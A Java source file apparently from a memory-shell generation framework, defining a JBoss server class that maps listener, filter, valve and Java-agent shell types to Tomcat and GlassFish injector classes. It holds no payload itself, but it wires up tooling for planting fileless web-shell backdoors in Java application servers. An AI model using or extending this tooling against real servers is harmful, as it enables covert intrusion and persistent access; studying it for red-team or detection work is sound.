package com.reajason.javaweb.memshell.server.jboss;

import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import com.reajason.javaweb.memshell.server.tomcat.Tomcat;


import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
public class Jboss extends AbstractServer {

    @Override
    public Class<?> getListenerInterceptor() {
        return Tomcat.ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterInjector")
                .addInjector(VALVE, "com.reajason.javaweb.memshell.injector.glassfish.GlassFishValveInjector")
                .addInjector(PROXY_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatProxyValveInjector")
                .addInjector(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterChainAgentInjector")
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatContextValveAgentInjector")
                .build();
    }
}
